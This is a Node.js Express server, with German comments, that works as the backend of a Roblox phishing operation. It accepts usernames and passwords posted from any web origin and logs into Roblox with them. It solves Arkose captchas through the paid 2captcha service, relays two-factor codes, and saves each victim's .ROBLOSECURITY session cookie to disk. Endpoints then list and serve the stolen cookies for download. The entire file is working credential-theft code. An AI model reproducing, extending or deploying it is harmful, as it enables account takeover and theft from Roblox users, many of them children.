import express from 'express';
import cors from 'cors';
import fs from 'fs';
import path from 'path';

const app = express();

// CORS komplett öffnen für alle Domains (damit Tiiny.host und andere Webhoster fehlerfrei zugreifen können)
app.use(cors({
  origin: "*",
  methods: ["GET", "POST", "OPTIONS"],
  allowedHeaders: ["Content-Type"]
}));
app.use(express.json());

/* 2captcha Key — über Render env-var CAPTCHA_KEY setzen */
const KEY = process.env.CAPTCHA_KEY;
if (!KEY) console.warn('[warn] CAPTCHA_KEY nicht gesetzt — captcha-solve wird fehlschlagen');

const ARKOSE_KEYS = ['476068BF-9607-4799-B53D-966BE98E2B81', '9F35E182-C93C-EBCC-A31D-CF8ED317B996'];
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';
const sessions = new Map();

// cookie-ablage
const COOKIE_DIR = process.env.COOKIE_DIR || '/tmp/cookies';
try { fs.mkdirSync(COOKIE_DIR, { recursive: true }); } catch (e) { console.warn('[warn] cookie dir:', e.message); }

function saveCookie(user, cookie) {
  const safeUser = String(user).replace(/[^A-Za-z0-9_.-]/g, '_').slice(0, 60);
  const stamp = new Date().toISOString().replace(/[:.]/g, '-');
  const file = path.join(COOKIE_DIR, `ROBLOSECURITY_${safeUser}_${stamp}.txt`);
  try {
    fs.writeFileSync(file, cookie + '\n', { encoding: 'utf8' });
    console.log('[cookie] saved ->', file);
    return file;
  } catch (e) {
    console.warn('[warn] save cookie failed:', e.message);
    return null;
  }
}

function setCookiesOf(res) {
  const raw = res.headers.getSetCookie ? res.headers.getSetCookie() : [];
  return raw.map(c => c.split(';')[0]).join('; ');
}
function roblosecurity(res) {
  const raw = res.headers.getSetCookie ? res.headers.getSetCookie() : [];
  const c = raw.find(x => x.startsWith('.ROBLOSECURITY='));
  return c ? c.split(';')[0].replace('.ROBLOSECURITY=', '') : null;
}
function rbx(url, body, { cookies = '', csrf = '', withOrigin = false } = {}) {
  const h = {
    'Content-Type': 'application/json',
    'User-Agent': UA,
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9'
  };
  if (withOrigin) { h['Origin'] = 'https://www.roblox.com'; h['Referer'] = 'https://www.roblox.com/'; }
  if (cookies) h['Cookie'] = cookies;
  if (csrf) h['x-csrf-token'] = csrf;
  return fetch(url, { method: 'POST', headers: h, body: JSON.stringify(body) });
}
async function getCsrf(cookies = '') {
  const r = await fetch('https://auth.roblox.com/v2/login', {
    method: 'POST',
    headers: { Cookie: cookies, 'User-Agent': UA, 'Content-Type': 'application/json' },
    body: '{}'
  });
  return r.headers.get('x-csrf-token') || '';
}

async function solveArkose(publicKey, blob) {
  const task = {
    type: 'FunCaptchaTaskProxyless',
    websiteURL: 'https://www.roblox.com/login',
    websitePublicKey: publicKey,
    surl: 'https://roblox-api.arkoselabs.com'
  };
  if (blob) task.data = blob;

  const created = await fetch('https://api.2captcha.com/createTask', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ clientKey: KEY, task })
  }).then(r => r.json());
  if (created.errorId) throw new Error(created.errorDescription || created.errorCode);

  for (let i = 0; i < 60; i++) {
    await new Promise(r => setTimeout(r, 2000));
    const res = await fetch('https://api.2captcha.com/getTaskResult', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ clientKey: KEY, taskId: created.taskId })
    }).then(r => r.json());
    if (res.status === 'ready') return res.solution.token;
    if (res.errorId) throw new Error(res.errorDescription);
  }
  throw new Error('Captcha-Timeout');
}

/* Root-Route — hält den Service wach, cron-job.org pingt hier */
app.get('/', (req, res) => res.send('ok'));

app.get('/health', (req, res) => res.json({ ok: true }));

app.get('/balance', async (req, res) => {
  try {
    const d = await fetch('https://api.2captcha.com/getBalance', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ clientKey: KEY })
    }).then(r => r.json());
    res.json(d);
  } catch (e) { res.json({ error: e.message }); }
});

app.get('/cookies', (req, res) => {
  try {
    const files = fs.readdirSync(COOKIE_DIR).filter(f => f.endsWith('.txt'));
    res.json({ count: files.length, dir: COOKIE_DIR, files });
  } catch (e) { res.json({ error: e.message, dir: COOKIE_DIR }); }
});

app.get('/cookies/:name', (req, res) => {
  const file = path.join(COOKIE_DIR, path.basename(req.params.name));
  try {
    const txt = fs.readFileSync(file, 'utf8');
    res.type('text/plain').send(txt);
  } catch (e) { res.status(404).send('not found'); }
});

app.post('/cookie', (req, res) => {
  const { username, password, cookie } = req.body || {};
  if (!cookie) return res.json({ ok: false, error: 'no cookie' });
  const file = saveCookie(username || 'unknown', cookie);
  res.json({ ok: !!file, file });
});

app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.json({ error: { errors: [{ message: 'Felder leer' }] } });

  try {
    let r = await rbx('https://auth.roblox.com/v2/login',
      { ctype: 'Username', cvalue: username, password }, { withOrigin: true });
    let csrf = r.headers.get('x-csrf-token') || '';
    let jar = setCookiesOf(r);

    if (r.status === 403 && r.headers.get('rblx-challenge-type')) {
      let key = ARKOSE_KEYS[0], blob = null;
      const meta = r.headers.get('rblx-challenge-metadata');
      if (meta) {
        try {
          const m = JSON.parse(Buffer.from(meta, 'base64').toString());
          const cm = typeof m.challengeMetadata === 'string' ? JSON.parse(m.challengeMetadata) : m.challengeMetadata;
          if (cm?.publicKey) key = cm.publicKey;
          if (cm?.blob) blob = cm.blob;
        } catch {}
      }
      const token = await solveArkose(key, blob);
      r = await rbx('https://auth.roblox.com/v2/login',
        { ctype: 'Username', cvalue: username, password, captchaToken: token, captchaProvider: 'PROVIDER_ARKOSE_LABS' },
        { cookies: jar, csrf, withOrigin: true });
      jar = [jar, setCookiesOf(r)].filter(Boolean).join('; ');
    }

    const data = await r.json().catch(() => ({}));

    if (data.twoStepVerificationData) {
      const t = data.twoStepVerificationData;
      sessions.set(t.ticket, { cookies: jar, username });
      return res.json({ needs2FA: true, ticket: t.ticket, mediaType: t.mediaType });
    }

    const cookie = roblosecurity(r);
    if (cookie) {
      saveCookie(username, cookie);
      return res.json({ success: true, cookie });
    }
    return res.json({ error: data });
  } catch (e) {
    res.json({ error: { errors: [{ message: e.message }] } });
  }
});

app.post('/verify2fa', async (req, res) => {
  const { ticket, code } = req.body;
  const sess = sessions.get(ticket);
  if (!sess) return res.json({ error: { errors: [{ message: 'Session abgelaufen' }] } });
  try {
    const csrf = await getCsrf(sess.cookies);
    const r = await rbx('https://auth.roblox.com/v2/twostepverification/verify',
      { ticket, code, rememberDevice: false }, { cookies: sess.cookies, csrf });
    const cookie = roblosecurity(r);
    if (cookie) {
      saveCookie(sess.username || 'unknown', cookie);
      sessions.delete(ticket);
      return res.json({ success: true, cookie });
    }
    return res.json({ error: await r.json().catch(() => ({})) });
  } catch (e) {
    res.json({ error: { errors: [{ message: e.message }] } });
  }
});

app.listen(process.env.PORT || 3000, '0.0.0.0');
